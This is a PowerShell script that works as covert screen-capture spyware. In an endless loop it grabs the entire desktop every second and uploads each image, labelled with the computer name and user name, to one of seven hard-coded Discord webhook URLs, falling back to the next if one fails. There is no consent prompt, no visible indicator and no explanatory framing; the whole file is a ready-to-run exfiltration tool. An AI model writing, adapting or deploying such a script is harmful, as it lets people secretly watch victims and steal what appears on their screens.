Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhooks = @(
    "https://discord.com/api/webhooks/1406003816142213152/u6XtfHXDpnx0wvc8IDfb0PpcGRXRoyVENJN7kQpH7rAtb60SwRErTsEW-mP_ctyv0D2w",
    "https://discord.com/api/webhooks/1406006916299362384/plq2qraPIHaOB0GKQzRY9e0-hXUndNlEQ8JY_zupIzl5ukF17u7TuWoNUBzepcF4DrMW",
    "https://discord.com/api/webhooks/1406006920053133323/lJ6UC7jp4rMdC-Nhsh1yqrO41jlYKelr1tcPf6OQ-EviYz_wyhj4uJ83n-PZfnIhassj",
    "https://discord.com/api/webhooks/1406006922624241766/MogYXK8vXO8n0R3c_Yart7MCOGwacIN6EXi6MOodQ4CKpEAo7C5n5kou4O72mxfelCLg",
    "https://discord.com/api/webhooks/1406006928609644574/cAeQtlYuy68S88DHwtPF8_vWMzwAh0A3kKcpARLb2wAUcvDYuxJtIRTBe51Sd6idB_L3",
    "https://discord.com/api/webhooks/1406006924125933600/wOWb0puaCkT5V_QPE30UR8QZp1CpsfTkh93HeqItNO54tr183-Df2i2ZcfJHL-20ZeT3",
    "https://discord.com/api/webhooks/1406006925379899514/rNxFXSUxHZQS5eIGs7vZoPHr9yQdg1e-VZ5eNQMyPAVR91bgwAfWcd29eLk1a-6F_M02"
)

$tempDir = Join-Path $env:TEMP "screenshots"
if (-not (Test-Path $tempDir)) {
    New-Item -Path $tempDir -ItemType Directory | Out-Null
}

$username = "$($env:COMPUTERNAME) | $($env:USERNAME)"

while ($true) {
    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

    $filePath = Join-Path $tempDir "VirtualScreen.jpg"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

    $graphics.Dispose()
    $bitmap.Dispose()

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $payload = @{
        username = $username
    } | ConvertTo-Json -Compress

    $bodyPrefix = (
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
        "$payload$LF" +
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
        "Content-Type: application/octet-stream$LF$LF"
    )

    $bodyPrefixBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyPrefix)
    $bodySuffixBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")

    $bodyBytes = New-Object byte[] ($bodyPrefixBytes.Length + $fileBytes.Length + $bodySuffixBytes.Length)
    [Array]::Copy($bodyPrefixBytes, 0, $bodyBytes, 0, $bodyPrefixBytes.Length)
    [Array]::Copy($fileBytes, 0, $bodyBytes, $bodyPrefixBytes.Length, $fileBytes.Length)
    [Array]::Copy($bodySuffixBytes, 0, $bodyBytes, $bodyPrefixBytes.Length + $fileBytes.Length, $bodySuffixBytes.Length)

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $sent = $false
    foreach ($webhook in $webhooks) {
        try {
            Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyBytes -Headers $headers -TimeoutSec 5
            $sent = $true
            break
        } catch {
            Write-Host "Failed sending to $webhook, trying next..."
        }
    }

    if (-not $sent) { Write-Host "All webhooks failed for this frame." }

    Start-Sleep -Seconds 1
}
